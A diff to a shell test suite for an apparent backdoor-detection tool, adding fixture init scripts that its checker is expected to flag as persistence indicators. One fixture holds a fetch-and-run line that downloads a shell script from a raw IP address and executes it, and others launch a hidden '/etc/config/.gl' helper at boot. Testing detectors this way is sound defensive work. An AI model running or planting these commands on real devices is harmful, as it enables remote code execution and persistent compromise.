@@ -435,9 +435,16 @@ printf 'x="$(: "\047")"; true; /etc/config/.gl/run.sh & y="$(: "\047")"\n' >"$U/
 printf "true;# don't\n/etc/config/.gl/run.sh &\ntrue;# isn't\n" >"$U/etc/init.d/q-hash"
 printf ": \$'\\\\'' ; /etc/config/.gl/run.sh & : \\\\'\n" >"$U/etc/init.d/q-dollar"
 printf 'CMD="sleep 5; /etc/config/.gl/run.sh"\nsh -c "$CMD" &\n' >"$U/etc/init.d/q-var"
+printf 'cat > /tmp/a.sh <<E\nwget -q -O /tmp/n \\\n http://65.20.71.131:8000/ni.sh\nsh /tmp/n\nE\nsh /tmp/a.sh\n' >"$U/etc/init.d/q-hdcont"
+printf 'x=$((1<<2))\nstart-stop-daemon -S -b \\\n -x /etc/config/.gl/gl-helper\n' >"$U/etc/init.d/q-shift"
+printf 'x=${y%%)#*}; /etc/config/.gl/run.sh &\n' >"$U/etc/init.d/q-sub"
+printf 'echo \\;#x; /etc/config/.gl/run.sh &\n' >"$U/etc/init.d/q-esc"
+printf 'echo "/etc/config/.gl/ found" >> /etc/profile.d/note.sh\n' >"$U/etc/init.d/q-note"
 mnt "$D" "$OWL"
 run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
 expect "here-document run later, sh -c and echo over lines, an open quote, watch, a long string, a backdoor name: each IOC persist-ref" '[ $rc = 1 ] && ( for n in hd shc cron open watch awk guard echo nest hash dollar var; do grep -q "IOC  *persist-ref  */etc/init.d/q-$n" "$D/check.txt" || exit 1; done )'
+expect "a \\ in a here-document or after a shift, a # sh reads as no comment: each IOC persist-ref" '( for n in hdcont shift sub esc; do grep -q "IOC  *persist-ref  */etc/init.d/q-$n" "$D/check.txt" || exit 1; done )'
+expect "a note written to a profile script, starting with a directory, runs nothing: no IOC" '! grep -q "IOC  *[a-z-]*  */etc/init.d/q-note" "$D/check.txt"'
 umount "$D/m"
 
 echo "=== owners who block the older backdoor's servers their own way (review of 2.54)"
